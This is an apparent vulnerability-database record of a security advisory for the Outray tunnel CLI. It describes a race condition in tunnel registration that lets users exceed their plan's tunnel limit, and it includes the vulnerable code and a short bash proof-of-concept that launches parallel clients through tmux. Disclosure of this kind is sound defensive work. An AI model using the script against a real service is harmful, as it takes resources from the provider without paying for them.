@@ -1,0 +1,274 @@
+advisory_id: GHSA-3pqc-836w-jgr7
+datasource_id: github_osv/GHSA-3pqc-836w-jgr7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-3pqc-836w-jgr7/GHSA-3pqc-836w-jgr7.json
+aliases:
+  - CVE-2026-22820
+summary: |
+  Outray cli is vulnerable to race conditions in tunnels creation
+  ### Summary
+
+  A TOCTOU race condition vulnerability allows a user to exceed the set number of active tunnels in their subscription plan.
+
+  ### Details
+
+  Affected conponent: `apps/web/src/routes/api/tunnel/register.ts`
+  - `/tunnel/register` endpoint code-:
+
+  ```ts
+  // Check if tunnel already exists in database
+            const [existingTunnel] = await db
+              .select()
+              .from(tunnels)
+              .where(eq(tunnels.url, tunnelUrl));
+
+            const isReconnection = !!existingTunnel;
+
+            console.log(
+              `[TUNNEL LIMIT CHECK] Org: ${organizationId}, Tunnel: ${tunnelId}`,
+            );
+            console.log(
+              `[TUNNEL LIMIT CHECK] Is Reconnection: ${isReconnection}`,
+            );
+            console.log(
+              `[TUNNEL LIMIT CHECK] Plan: ${currentPlan}, Limit: ${tunnelLimit}`,
+            );
+
+            // Check limits only for NEW tunnels (not reconnections)
+            if (!isReconnection) {
+              // Count active tunnels from Redis SET
+              const activeCount = await redis.scard(setKey);
+              console.log(
+                `[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
+              );
+
+              // The current tunnel is NOT yet in the online_tunnels set (added after successful registration)
+              // So we check if activeCount >= limit (not >)
+              if (activeCount >= tunnelLimit) {
+                console.log(
+                  `[TUNNEL LIMIT CHECK] REJECTED - ${activeCount} >= ${tunnelLimit}`,
+                );
+                return json(
+                  {
+                    error: `Tunnel limit reached. The ${currentPlan} plan allows ${tunnelLimit} active tunnel${tunnelLimit > 1 ? "s" : ""}.`,
+                  },
+                  { status: 403 },
+                );
+              }
+              console.log(
+                `[TUNNEL LIMIT CHECK] ALLOWED - ${activeCount} < ${tunnelLimit}`,
+              );
+            } else {
+              console.log(`[TUNNEL LIMIT CHECK] SKIPPED - Reconnection detected`);
+            }
+
+            if (existingTunnel) {
+              // Tunnel with this URL already exists, update lastSeenAt
+              await db
+                .update(tunnels)
+                .set({ lastSeenAt: new Date() })
+                .where(eq(tunnels.id, existingTunnel.id));
+
+              return json({
+                success: true,
+                tunnelId: existingTunnel.id,
+              });
+            }
+
+            // Create new tunnel record
+            const tunnelRecord = {
+              id: randomUUID(),
+              url: tunnelUrl,
+              userId,
+              organizationId,
+              name: name || null,
+              protocol,
+              remotePort: remotePort || null,
+              lastSeenAt: new Date(),
+              createdAt: new Date(),
+              updatedAt: new Date(),
+            };
+
+            await db.insert(tunnels).values(tunnelRecord);
+
+            return json({ success: true, tunnelId: tunnelRecord.id });
+          } catch (error) {
+            console.error("Tunnel registration error:", error);
+            return json({ error: "Internal server error" }, { status: 500 });
+          }
+  ```
+  - It checks if the tunnel exists in the database.
+  ```ts
+  // Check if tunnel already exists in database
+            const [existingTunnel] = await db
+              .select()
+              .from(tunnels)
+              .where(eq(tunnels.url, tunnelUrl));
+
+            const isReconnection = !!existingTunnel;
+  ```
+
+  - Limit is checked here-:
+  ```ts
+  // Check limits only for NEW tunnels (not reconnections)
+
+  if (!isReconnection) {
+
+  // Count active tunnels from Redis SET
+
+  const activeCount = await redis.scard(setKey);
+
+  console.log(
+
+  `[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
+
+  );
+  ```
+  - Redis is checked for existing tunnel to check for reconnection.
+  ```ts
+  // Check limits only for NEW tunnels (not reconnections)
+            if (!isReconnection) {
+              // Count active tunnels from Redis SET
+              const activeCount = await redis.scard(setKey);
+              console.log(
+                `[TUNNEL LIMIT CHECK] Active count in Redis: ${activeCount}`,
+              );
+  ```
+
+  - If the tunnel limit is exceeded, it pops up the tunnel limit error.
+
+  ```ts
+  if (activeCount >= tunnelLimit) {
+                console.log(
+                  `[TUNNEL LIMIT CHECK] REJECTED - ${activeCount} >= ${tunnelLimit}`,
+                );
+                return json(
+                  {
+                    error: `Tunnel limit reached. The ${currentPlan} plan allows ${tunnelLimit} active tunnel${tunnelLimit > 1 ? "s" : ""}.`,
+                  },
+                  { status: 403 },
+                );
+  ```
+  - If the limit is not exceeded, it triggers a the `Insert` Statement without locking transactions from other request
+
+  ```ts
+  await db.insert(tunnels).values(tunnelRecord);
+  ```
+  - If parallel requests are made by the `wshandler` in `/outray/outray-main/apps/tunnel/src/core/WSHandler.ts` from the command line app. A request can work on a non updated  row  because the `insert` row has not been triggered allowing the user to bypass the limit. It is much explained in the proof of concept. The key takeaway is db transactions should remain locked.
+
+  ### PoC
+
+  Using this simple bash script, the `outray` binary will be run at the same time in one `tmux` window, demonstrating the race condition and opening 4 tunnels.
+
+  ```bash
+  #!/usr/bin/env bash
+
+  # POC for Outray Tunnel Race condition
+  SESSION="outray-race"
+  PORTS=(8090 4000 5000 6000)
+
+  # Create new detached tmux session
+  tmux new-session -d -s "$SESSION" "echo '[*] outray race session started'; bash"
+
+  # Split the panes and run outray
+  for i in "${!PORTS[@]}"; do
+    port="${PORTS[$i]}"
+
+    if [ "$i" -ne 0 ]; then
+      tmux split-window -t "$SESSION" -h
+      tmux select-layout -t "$SESSION" tiled
+    fi
+
+    tmux send-keys -t "$SESSION" "echo '[*] Running outray on port $port'; outray $port" C-m
+  done
+
+  tmux set-window-option -t "$SESSION" synchronize-panes off
+
+  echo "[+] tmux session '$SESSION' created"
+  echo "[+] Attach with: tmux attach -t $SESSION"
+
+  ```
+
+  Running this
+
+  ```
+  seeker@instance-20260106-20011$ bash kay.sh
+  [+] tmux session 'outray-race' created
+  [+] Attach with: tmux attach -t outray-race
+
+  seeker@instance-20260106-20011$ tmux attach -t outray-race
+  ```
+
+  <img width="1909" height="1021" alt="image" src="https://github.com/user-attachments/assets/c234cc94-fc25-4542-abdf-815332493a85" />
+
+
+  <img width="1907" height="936" alt="image" src="https://github.com/user-attachments/assets/1c302d7f-1ca6-46af-ab72-60fd01cdfded" />
+
+  ### Impact
+
+  By exploiting this TOCTOU race condition in the affected component, the intended limit is bypassed and server resources is used with no extra billing charges on the user.
+impacted_packages:
+  - purl: pkg:github/outray-tunnel/outray
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/outray-tunnel/outray
+        commit: 08c61495761349e7fd2965229c3faa8d7b1c1581
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/outray
+    affected_versions: vers:npm/<0.1.5
+    fixed_versions: vers:npm/0.1.5
+    affected_packages:
+      - pkg:npm/outray@0.0.1
+      - pkg:npm/outray@0.0.2
+      - pkg:npm/outray@0.0.3
+      - pkg:npm/outray@0.0.6
+      - pkg:npm/outray@0.0.7
+      - pkg:npm/outray@0.0.8
+      - pkg:npm/outray@0.0.9
+      - pkg:npm/outray@0.1.0
+      - pkg:npm/outray@0.1.1
+      - pkg:npm/outray@0.1.2
+      - pkg:npm/outray@0.1.3
+      - pkg:npm/outray@0.1.4
+    fixed_packages:
+      - pkg:npm/outray@0.1.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '3.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-3pqc-836w-jgr7/GHSA-3pqc-836w-jgr7.json
+  - score: '6.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-3pqc-836w-jgr7/GHSA-3pqc-836w-jgr7.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-367
+references:
+  - url: https://github.com/akinloluwami/outray
+    reference_type:
+    reference_id:
+  - url: https://github.com/outray-tunnel/outray/commit/08c61495761349e7fd2965229c3faa8d7b1c1581
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-22820
+    reference_type:
+    reference_id: CVE-2026-22820
+  - url: https://github.com/akinloluwami/outray/security/advisories/GHSA-3pqc-836w-jgr7
+    reference_type:
+    reference_id: GHSA-3pqc-836w-jgr7
+  - url: https://github.com/outray-tunnel/outray/security/advisories/GHSA-3pqc-836w-jgr7
+    reference_type:
+    reference_id: GHSA-3pqc-836w-jgr7
+exploits: []
